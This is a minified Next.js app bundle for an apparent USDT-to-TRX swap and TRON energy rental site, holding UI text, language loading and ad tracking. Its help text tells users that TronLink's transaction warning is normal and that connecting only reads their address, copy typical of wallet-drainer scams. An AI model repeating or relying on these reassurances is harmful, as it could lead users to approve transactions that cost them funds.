(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [888], {
        1118: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/_app", function() {
                return n(3414)
            }])
        },
        632: function(e, t, n) {
            "use strict";
            n.d(t, {
                _f: function() {
                    return s
                },
                Wg: function() {
                    return l
                },
                Sv: function() {
                    return c
                }
            });
            var r = n(7294),
                a = {
                    pageTitle: "USDT to TRX Conversion & TRON Energy Purchase | Fast, Secure, Reliable",
                    desc: "Even with zero TRX in your wallet, you can still swap USDT to TRX — all network fees are fully covered by the platform.",
                    buyEnergy: "Rent Energy",
                    flashExchange: "Instant Swap",
                    payLabel: "Pay",
                    receiveLabel: "Receive",
                    exchangeRate: "Rate",
                    payment: "Amount",
                    exchangeNow: "Swap Now",
                    buyCount: "Quantity",
                    tip: "Select 2\xd7 when the receiver has no USDT.",
                    getEnergy: "Energy Received",
                    purchaseBtn: "Rent Now",
                    partners: "Our Partners",
                    instructionFaqTitle: "How It Works \xb7 FAQ",
                    faqQuestion1: "1. Is it safe to connect my wallet?",
                    faqAnswer1: "Yes — connecting only reads your wallet address. You remain in full control of your assets and must manually sign every action.",
                    faqQuestion2: "2. Which wallets are supported?",
                    faqAnswer2: "All major TRON wallets are supported, including TronLink, Trust Wallet, and any TRC-20 compatible wallet.",
                    faqQuestion3: "3. Do I need to register or verify my identity (KYC)?",
                    faqAnswer3: "The current flow does not require a traditional account signup. Users should review the applicable legal and compliance pages before proceeding.",
                    faqQuestion4: "4. Is this a custodial service?",
                    faqAnswer4: "No. It’s a non-custodial on-chain tool. All transactions are executed directly on the TRON blockchain, and your assets never leave your wallet unless you approve.",
                    faqQuestion5: "5. How long does it take?",
                    faqAnswer5: "Most swaps confirm within 3-6 seconds. The process is optimized for the TRON network’s high throughput and reliability.",
                    helpBtnAria: "TronLink Help",
                    helpBtnLine1: "TronLink",
                    helpBtnLine2: "Help",
                    modalTitle: "How to Confirm in TronLink",
                    step1ImgAlt: "TronLink Contract Confirmation Window",
                    step1TextPart1: "This is the confirmation window from TronLink wallet. The address ",
                    step1TextPart2: " is the USDT contract address shown for the transaction request. Review the wallet prompt carefully and confirm only if the displayed details match your selected action.",
                    step2ImgAlt: "TronLink Warning Popup",
                    step2Text: "The wallet warning about TRX or energy usage is part of the normal transaction review flow. Review the prompt carefully before you decide whether to confirm.",
                    footerNote: "The process usually completes within 3–6 seconds. Please wait patiently.",
                    walletConnectFailed: "Wallet connection failed. Please try again.",
                    chooseWallet: "Connect Wallet",
                    trustWallet: "Trust Wallet",
                    tronlinkWallet: "TronLink",
                    WALLET_LOADING_CONNECT: "Connecting to {wallet}...",
                    WALLET_CONNECT_SUCCESS: "{wallet} connected successfully",
                    WALLET_CONNECT_FAIL: "Couldn’t connect to {wallet}",
                    WALLET_NO_ADDRESS: "No address detected in {wallet}",
                    QR_TRUST_TITLE: "Scan with Trust Wallet to connect",
                    SUCCESS: "Transaction submitted",
                    ERR_UNKNOWN: "Unexpected error",
                    LOADING_PREPARE: "Preparing transaction...",
                    LOADING_SIGN: "Awaiting signature...",
                    LOADING_SUBMIT: "Submitting transaction...",
                    USER_CANCEL: "You cancelled the signature",
                    NOT_CONNECTED: "Please connect your wallet first",
                    TX_MISSING: "Unsigned transaction missing",
                    SIGN_API_MISSING: "Wallet signing API unavailable",
                    ERR_BROADCAST: "Broadcast failed",
                    1001: "Another transaction is still pending",
                    1002: "Multisig wallets are not supported",
                    1003: "Insufficient balance to proceed",
                    1004: "Network unstable, please try again",
                    2001: "Invalid transaction. Keep default",
                    2002: "Transaction expired, please retry",
                    2003: "Invalid or rejected transaction",
                    2004: "Signature error, please retry",
                    2005: "Broadcast failed, try again later"
                };
            async function i(e) {
                if (!e || "en" === e) return a;
                let t = {
                    zh: () => n.e(203).then(n.bind(n, 203)),
                    ru: () => n.e(234).then(n.bind(n, 3234)),
                    ja: () => n.e(966).then(n.bind(n, 5966)),
                    ko: () => n.e(360).then(n.bind(n, 2360)),
                    es: () => n.e(403).then(n.bind(n, 9403)),
                    tr: () => n.e(764).then(n.bind(n, 7764)),
                    fr: () => n.e(591).then(n.bind(n, 1591)),
                    de: () => n.e(671).then(n.bind(n, 6671)),
                    pt: () => n.e(332).then(n.bind(n, 332)),
                    ar: () => n.e(21).then(n.bind(n, 21)),
                    hi: () => n.e(358).then(n.bind(n, 6358)),
                    th: () => n.e(498).then(n.bind(n, 5498)),
                    vi: () => n.e(598).then(n.bind(n, 4598)),
                    id: () => n.e(270).then(n.bind(n, 4270)),
                    uk: () => n.e(625).then(n.bind(n, 7625)),
                    pl: () => n.e(236).then(n.bind(n, 7236)),
                    it: () => n.e(428).then(n.bind(n, 1428)),
                    nl: () => n.e(383).then(n.bind(n, 7383)),
                    cs: () => n.e(559).then(n.bind(n, 1559)),
                    ms: () => n.e(333).then(n.bind(n, 333))
                }[e];
                if (!t) return a;
                let r = new Promise((e, t) => setTimeout(() => t(Error("i18n load timeout")), 1500));
                try {
                    let e = await Promise.race([t(), r]);
                    return e && e.default || a
                } catch (e) {
                    return a
                }
            }
            async function o(e) {
                try {
                    return await i(e)
                } catch (e) {
                    return a
                }
            }

            function s() {
                {
                    let e = localStorage.getItem("lang");
                    if (e) return e;
                    let t = (navigator.language || "").toLowerCase();
                    if (t.startsWith("zh")) return "zh";
                    if (t.startsWith("ru")) return "ru";
                    if (t.startsWith("ja")) return "ja";
                    if (t.startsWith("ko")) return "ko";
                    if (t.startsWith("es")) return "es";
                    if (t.startsWith("tr")) return "tr";
                    if (t.startsWith("fr")) return "fr";
                    if (t.startsWith("de")) return "de";
                    if (t.startsWith("pt")) return "pt";
                    if (t.startsWith("ar")) return "ar";
                    if (t.startsWith("hi")) return "hi";
                    if (t.startsWith("th")) return "th";
                    if (t.startsWith("vi")) return "vi";
                    if (t.startsWith("id")) return "id";
                    if (t.startsWith("uk")) return "uk";
                    if (t.startsWith("pl")) return "pl";
                    if (t.startsWith("it")) return "it";
                    if (t.startsWith("nl")) return "nl";
                    if (t.startsWith("cs")) return "cs";
                    if (t.startsWith("ms")) return "ms"
                }
                return "en"
            }

            function l(e) {
                localStorage.setItem("lang", e), window.dispatchEvent(new CustomEvent("langChange", {
                    detail: e
                }))
            }

            function c() {
                let [e, t] = (0, r.useState)(s()), [n, i] = (0, r.useState)(a), l = (0, r.useRef)(!1);
                return (0, r.useEffect)(() => (l.current = !0, () => {
                        l.current = !1
                    }), []), (0, r.useEffect)(() => {
                        let t = !1;
                        return (async () => {
                            let n = await o(e);
                            !t && l.current && i(n || a)
                        })(), () => {
                            t = !0
                        }
                    }, [e]), (0, r.useEffect)(() => {
                        let e = e => t(e.detail);
                        return window.addEventListener("langChange", e), () => window.removeEventListener("langChange", e)
                    }, []),
                    function(e) {
                        var t;
                        let r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                            i = null !== (t = (n || a)[e]) && void 0 !== t ? t : e;
                        for (let e of Object.keys(r)) i = i.replace(RegExp("{".concat(e, "}"), "g"), r[e]);
                        return i
                    }
            }
        },
        3414: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return d
                }
            });
            var r = n(5893),
                a = n(7294),
                i = n(9008),
                o = n.n(i),
                s = n(4298),
                l = n.n(s),
                c = n(632);
            n(6904), n(9311);
            let u = "1774103392122066231";

            function d(e) {
                let {
                    Component: t,
                    pageProps: n
                } = e;
                (0, a.useEffect)(() => {
                    try {
                        window.__BUILD_SALT__ = u, document.documentElement.setAttribute("data-build-salt", u)
                    } catch (e) {}
                }, []), (0, a.useEffect)(() => {
                    window.APP_STATE || (window.APP_STATE = {}), window.APP_STATE.wallet || (window.APP_STATE.wallet = {
                            connected: !1,
                            type: null,
                            address: null
                        }),
                        function() {
                            try {
                                var e, t;
                                null === (e = window.localStorage) || void 0 === e || e.removeItem("walletconnect"), null === (t = window.sessionStorage) || void 0 === t || t.removeItem("walletconnect"), window.indexedDB && window.indexedDB.deleteDatabase("WALLET_CONNECT_V2_INDEXED_DB")
                            } catch (e) {
                                console.warn("⚠️ 清理 WalletConnect 存储失败:", e)
                            }
                        }()
                }, []);
                let i = (0, c.Sv)()("pageTitle") || "USDT to TRX Conversion & TRON Energy Purchase | Fast, Secure, Reliable";
                return (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: i
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: i
                        }), (0, r.jsx)("meta", {
                            name: "x-build-salt",
                            content: u
                        })]
                    }), (0, r.jsx)(l(), {
                        src: "https://www.googletagmanager.com/gtag/js?id=AW-428375910",
                        strategy: "afterInteractive"
                    }), (0, r.jsx)(l(), {
                        id: "google-ads",
                        strategy: "afterInteractive",
                        children: "\n          window.dataLayer = window.dataLayer || [];\n          function gtag(){dataLayer.push(arguments);}\n          gtag('js', new Date());\n          gtag('config', 'AW-428375910');\n        "
                    }), (0, r.jsx)(t, { ...n
                    })]
                })
            }
        },
        9311: function() {},
        6904: function() {},
        9008: function(e, t, n) {
            e.exports = n(7828)
        },
        4298: function(e, t, n) {
            e.exports = n(2892)
        }
    },
    function(e) {
        var t = function(t) {
            return e(e.s = t)
        };
        e.O(0, [774, 179], function() {
            return t(1118), t(9090)
        }), _N_E = e.O()
    }
]);
